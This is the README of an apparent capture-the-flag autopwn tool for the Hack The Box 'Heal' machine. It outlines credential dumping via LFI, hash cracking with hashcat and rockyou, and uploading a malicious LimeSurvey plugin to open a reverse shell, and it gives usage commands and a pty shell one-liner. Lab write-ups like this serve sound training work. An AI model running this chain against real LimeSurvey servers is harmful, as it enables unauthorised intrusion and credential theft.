# Heal HTB AutoPwn – Autopwn Script

A full exploitation automation script for the **Heal** Linux machine on Hack The Box. Full write Up -> [WriteUp.md](https://github.com/maikneysm/AutoPwn-Heal.htb/blob/main/WriteUp.md)
## 📋 Description

This tool automates the following:
- Dumping LimeSurvey credentials via LFI
- Cracking the password hash manually (Hashcat/rockyou)
- Deploying a malicious LimeSurvey plugin to trigger a reverse shell
    

---
## 🧠 Requirements

- Python 3.8+
- `requests`
- `bs4`
Install dependencies with:

```bash
pip install requests beautifulsoup4
```

---
## ⚙️ Usage

### Phase 1: Dump and Crack Credentials

```bash
python3 autopwn.py --type getCredentials
```

This will:
- Log in to thevulnerable API
- Dump the SQLite file via LFI
- Extract the email and password hash
- Print the hash with a note like:
    

```
Crack this hash using `hashcat` or a wordlist like `rockyou.txt`
Once cracked, proceed to the next phase with --type getRevShellSlime
```

You can crack it like this:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### Phase 2: Deploy Reverse Shell via LimeSurvey Plugin
```bash
python3 autopwn.py \
  --type getRevShellSlime \
  --lhost <YOUR-IP> \
  --lport <YOUR-PORT> \
  --adminuser ralph@heal.htb \
  --adminpass <CRACKED-PASSWORD>
```

This will:

1. Generate a malicious LimeSurvey plugin (`pwned.zip`)
2. Log in to the LimeSurvey admin panel
3. Upload and install the plugin
4. Trigger the reverse shell
5. Automatically start a listener and spawn a `/bin/bash` shell
    

---

## 💡 Notes

- The tool checks if the plugin is already uploaded before re-uploading it.
- You can kill the listener cleanly with `Ctrl+C`.
- The script handles CSRF token parsing and redirections automatically.
- If the reverse shell behaves oddly, you can stabilize it inside the shell with:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
